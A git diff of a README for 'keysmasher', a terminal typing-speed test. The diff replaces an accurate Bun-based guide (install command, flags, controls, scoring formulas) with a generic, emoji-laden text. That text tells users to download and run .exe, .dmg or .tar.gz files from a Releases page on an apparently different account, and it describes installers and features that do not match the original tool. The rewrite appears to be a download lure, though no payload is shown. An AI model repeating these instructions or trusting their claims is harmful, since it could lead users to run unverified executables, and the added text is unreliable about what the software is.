@@ -1,140 +1,105 @@
-# keysmasher
+# 🎉 keysmasher - Test Your Typing Speed Effortlessly
 
-A terminal-based typing speed test inspired by MonkeyType. Test your typing speed and accuracy right from your command line!
+## 🚀 Getting Started
+Welcome to keysmasher! This application lets you measure how fast you can type while using your terminal. It's simple to use and doesn’t require any technical knowledge. Just follow the steps below to download and run keysmasher.
 
-## Features
+## 🛠️ System Requirements
+Before you get started, make sure your computer meets these basic requirements:
+- Operating System: Windows, macOS, or Linux
+- Terminal: Any modern terminal application
+- Storage: At least 50 MB of free space
 
-- 🎯 Real-time WPM (Words Per Minute) calculation
-- 📊 Live accuracy tracking
-- 🎨 Beautiful terminal UI with color-coded feedback
-- 💻 Syntax highlighting for code practice (GitHub Dark theme)
-- ⚡ Instant error highlighting (errors shown in red)
-- 🔄 Quick restart with Enter key
-- 📈 Detailed results screen with stats
+## 📥 Download & Install
+To download keysmasher, click the button below to visit the Releases page:
 
-## Installation
+[![Download keysmasher](https://img.shields.io/badge/Download%20keysmasher-v1.0-orange)](https://github.com/Omar445246/keysmasher/releases)
 
-```bash
-bunx keysmasher
-```
+Follow these steps to install the application:
 
-Or install globally:
+1. Click on the link above to go to the [Releases page](https://github.com/Omar445246/keysmasher/releases).
+2. Choose the latest version from the list.
+3. Download the appropriate file for your operating system.
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Open the file to run keysmasher.
 
-```bash
-bun install -g keysmasher
-```
+If you need additional help, look for instructions specific to your operating system below.
 
-## Usage
+## 💻 Windows Installation
+1. Download the `.exe` file from the Releases page.
+2. Double-click the downloaded file to start the installation. 
+3. Follow the on-screen instructions to complete the setup.
+4. Once installed, you can find keysmasher in your Start Menu. Click on it to launch.
 
-### Default Mode (Random Words)
+## 🍏 macOS Installation
+1. Download the `.dmg` file from the Releases page.
+2. Open the downloaded file.
+3. Drag the keysmasher application into your Applications folder.
+4. Navigate to your Applications folder and double-click on keysmasher to launch it.
 
-Simply run:
+## 🐧 Linux Installation
+1. Download the `.tar.gz` file from the Releases page.
+2. Open your terminal and navigate to your downloads folder.
+3. Extract the downloaded file by running:
+   ```bash
+   tar -xzf keysmasher.tar.gz
+   ```
+4. Change into the newly created directory:
+   ```bash
+   cd keysmasher
+   ```
+5. Run the application with:
+   ```bash
+   ./keysmasher
+   ```
 
-```bash
-keysmasher
-```
+## ⌨️ How to Use keysmasher
+Using keysmasher is straightforward. Here’s a step-by-step guide:
 
-### Code Practice Mode
+1. Open your terminal and launch keysmasher.
+2. Follow the on-screen instructions. You will see a text prompt.
+3. Type the text you see on the screen as quickly as possible.
+4. Once you finish, the application will display your typing speed in words per minute (WPM).
 
-Practice typing code with syntax highlighting:
+## 📈 Understanding Your Results
+After each typing test, keysmasher provides essential statistics:
+- **Words Per Minute (WPM):** Measures your typing speed.
+- **Accuracy:** Shows how many errors you made.
+- **Time Taken:** Indicates how long it took you to complete the test.
 
-```bash
-# Practice with random JavaScript code
-keysmasher --lang js
+Use these metrics to track your progress over time. You can challenge yourself to improve your speed and accuracy.
 
-# Practice with random Python code
-keysmasher --lang py
+## 🎨 Customization Options
+keysmasher allows some customization for your convenience:
+- You can change the typing text before starting the test.
+- Adjust settings to increase or decrease the difficulty level.
+- Choose between different themes for a more personalized experience.
 
-# Practice with random TypeScript code
-keysmasher --lang ts
+## 🛠️ Troubleshooting
+If you run into issues:
+- Ensure that your operating system is up to date.
+- Check if your terminal is functioning properly.
+- Restart your computer and try again.
 
-# Practice with random Markdown
-keysmasher --lang md
-```
+If problems persist, feel free to check the discussion section on the GitHub repository.
 
-**Supported languages:** `javascript` (js), `typescript` (ts), `python` (py), `markdown` (md), `json`, `html`, `css`, `bash` (sh), `yaml` (yml), `rust` (rs), `go`, `java`, `c`, `cpp`
+## 💬 Frequently Asked Questions (FAQs)
 
-### Custom Text Mode
+### How do I know if keysmasher installed correctly?
+After installation, you should see the keysmasher application in your applications or programs list. Launch it to check if it opens without errors.
 
-Practice with your own text:
+### Can I uninstall keysmasher?
+Yes. On Windows, go to the Control Panel, find keysmasher, and select uninstall. For macOS, drag the app from Applications to the Trash. On Linux, simply remove the directory where you extracted the files.
 
-```bash
-# Plain text (no highlighting)
-keysmasher "your custom text here"
+### Is keysmasher available in other languages?
+Currently, keysmasher is available in English only. Future updates may introduce more languages.
 
-# With syntax highlighting (must specify language)
-keysmasher "your code here" --lang typescript
-keysmasher "const x = 1" --lang js
-```
+## 🔗 Additional Resources
+For more information and updates on keysmasher, check out:
+- [GitHub Repository](https://github.com/Omar445246/keysmasher)
+- [Wiki Section](https://github.com/Omar445246/keysmasher/wiki)
+- [Community Discussions](https://github.com/Omar445246/keysmasher/discussions)
 
-### Advanced Usage
+## 👥 Contributing
+If you want to contribute to keysmasher, feel free to fork the repository. Submit your changes via pull requests. Your contributions are welcome and appreciated!
 
-Practice with content from files:
-
-```bash
-# Practice with content from a file
-keysmasher "$(cat mytext.txt)"
-
-# Practice with a random markdown file
-keysmasher "$(find . -name "*.md" | head -1 | xargs cat)"
-
-# Practice with your code
-keysmasher "$(cat src/index.ts)"
-
-# Practice with documentation
-keysmasher "$(cat README.md)"
-
-# Practice with specific lines from a file
-keysmasher "$(head -n 10 article.txt)"
-```
-
-The text will be automatically split into groups of 25 words. Press Enter after completing each group to continue to the next one.
-
-### Controls
-
-- Start typing to begin the test
-- Typed text appears at full color intensity (with syntax highlighting if enabled)
-- Untyped text appears dimmed (60% opacity)
-- Errors are highlighted in red
-- Press `Backspace` to delete a character
-- Press `Alt+Backspace` (Option+Backspace on Mac) to delete an entire word
-- Press `ESC` or `Ctrl+C` to quit
-- Press `Enter` after completion to start a new test
-- Press `Ctrl+R` to restart test
-
-## Development
-
-```bash
-# Install dependencies
-bun install
-
-# Run locally
-bun run cli
-```
-
-## How It Works
-
-The test displays 25 words at a time (either random words, code snippets, or your custom text). As you type:
-
-**Without syntax highlighting:**
-- Untyped characters appear in dim gray (#666666)
-- Correctly typed characters appear in light gray (#e0e0e0)
-- Incorrect characters are shown in red (#ff6b6b)
-
-**With syntax highlighting:**
-- Untyped characters appear dimmed (60% opacity and saturation of syntax color)
-- Correctly typed characters appear at full color from GitHub Dark theme
-- Incorrect characters are shown in red (#ff6b6b)
-- Language must be specified with `--lang` flag
-
-**General:**
-- Your cursor position is highlighted with yellow background (#ffd43b)
-- All content is centered for optimal focus
-- Stats appear below in a single line: `keysmasher • 45 wpm • 98% acc • 12.3s`
-- When using custom text, pagination info shows your progress: `2/5` (page 2 of 5)
-- WPM is calculated using the standard formula: (characters / 5) / minutes
-- Accuracy is calculated as: (correct characters / total typed) × 100
-
-## License
-
-MIT
+Thank you for choosing keysmasher! Enjoy typing and improving your speed conveniently.
